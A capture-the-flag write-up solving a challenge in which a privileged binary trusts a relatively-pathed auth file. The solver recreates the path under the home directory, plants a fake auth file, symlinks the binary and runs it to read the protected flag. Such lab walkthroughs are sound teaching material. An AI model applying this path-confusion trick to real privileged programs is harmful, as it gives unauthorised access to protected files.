First of all move to the correct directory by using the *cd* command:
```bash
cd /problems/579fe8ee083cd54f55718c1324687c74
```

Here we find 4 different files by writing **ls**.
The most interesting file is the **C-file**, which we can read by writing:
```bash
cat justno.c
```

In the code we can see that they are mixing relative and exact positions.
```c
Line 8:
../../problems/579fe8ee083cd54f55718c1324687c74/auth

Line 18:
/problems/579fe8ee083cd54f55718c1324687c74/flag
```

This means that one of the files could change without affecting the other one.
This could be abused in some situations, which is exactly what we will do.

Let's go back to our home directory by running the *cd* command without arguments:
```bash
cd
```

Then we will create a folder-structure matching the relative link in the code.
``home
|  problems
|     579fe8ee083cd54f55718c1324687c74
|        auth
+- a
      b
         justno``

*auth* should be a file containing anything other than the text 'no' according to the previous code.
*justno* should be the binary file associated with the *C-file*.
We can however not compile it on our own since then it won't have the correct rights.
The same problem applies if we try to copy the first file.
So what we have to do is to create a symbolic link to the file. This is done by using the *cp* command with the *-s* attribute.

We do this by entering the following commands:
```bash
mkdir a problems
mkdir a/b
mkdir problems/579fe8ee083cd54f55718c1324687c74

echo "yes" > problems/579fe8ee083cd54f55718c1324687c74/auth
cd a/b
cp -s /problems/579fe8ee083cd54f55718c1324687c74/justno ./
./justno
```
